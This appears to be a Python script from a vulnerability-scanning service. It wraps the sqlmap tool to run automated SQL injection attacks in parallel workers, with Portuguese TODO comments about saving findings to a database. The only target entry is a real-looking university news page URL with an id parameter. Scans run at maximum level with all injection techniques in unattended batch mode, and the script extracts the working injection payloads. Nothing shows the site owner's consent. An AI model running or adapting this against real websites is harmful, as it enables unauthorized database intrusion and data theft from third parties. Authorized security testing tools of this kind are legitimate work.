from multiprocessing import Pool
from time import sleep
from subprocess import run, PIPE
import re
import os
import json

entries = [
    {
        'url': "http://rge.fmrp.usp.br/mostra_noticia.php",
        'method': "get",
        'vars': [
            {'name': 'id', 'value': '388'},
        ]
    }
]


def run_sqlmap(entry):
    sqlmap_command = ['sqlmap', '-u']
    sqlmap_urlstring = entry['url']+'?'
    for var in entry['vars']:
        if not 'type' in var: # if there is no type, its a querystring url
            sqlmap_urlstring += f"{var['name']}={var['value'] if var['value'] else 'a'}&"
    sqlmap_command.append(sqlmap_urlstring[:-1])
    sqlmap_command.append(f'--method={entry["method"].lower()}')
    if entry['method'].lower() != 'get':
        sqlmap_datastring = '--data='
        for var in entry['vars']:
            if 'type' in var:
                sqlmap_datastring += f"{var['name']}={var['value'] if var['value'] else 'a'}&"
        sqlmap_command.append(sqlmap_datastring[:-1])
    
    sqlmap_command.append('--threads=1')
    sqlmap_command.append('--level=5')
    sqlmap_command.append('--smart')
    sqlmap_command.append('--technique=BEUSTQ')
    sqlmap_command.append('--batch')
    sqlmap_command.append('--disable-coloring')
    result = run(sqlmap_command, stdout=PIPE)
    
    if b'all tested parameters do not appear to be injectable.' in result.stdout:
        # TODO PARA O CAINA: falar pro db que não achou a vulnerabilidade nesse path
        pass # not injectable
    else:
        injectable_str = result.stdout.split(b'\n---\n')[1].decode()
        parameter_reg = re.search(r'(\s*Parameter: )(.+)( \((.+)\))', injectable_str.split('\n')[0])
        output = {
            "parameter": parameter_reg[2],
            "method": parameter_reg[4],
            "techniques": [],
        }
        techniques_str = injectable_str.split('\n\n')
        for technique in techniques_str:
            output['techniques'].append({
                "type": re.search(r'(\s+Type: )(.+)', technique)[2],
                "title": re.search(r'(\s+Title: )(.+)', technique)[2],
                "payload": re.search(r'(\s+Payload: )(.+)', technique)[2],
            })
        # TODO PARA O CAINA: guardar esses atributos no db
        print(json.dumps(output, indent = 2))

# TODO: guardar os logs do sqlmap ou algo q seja verificavel em algum lugar
# OUTRO TODO: maybe colocar um try catch aqui pra quando der problema não derrubar o serviço todo 

pool = Pool(processes=int(os.getenv('NUM_WORKERS', 4)))
pool.map(run_sqlmap, entries)
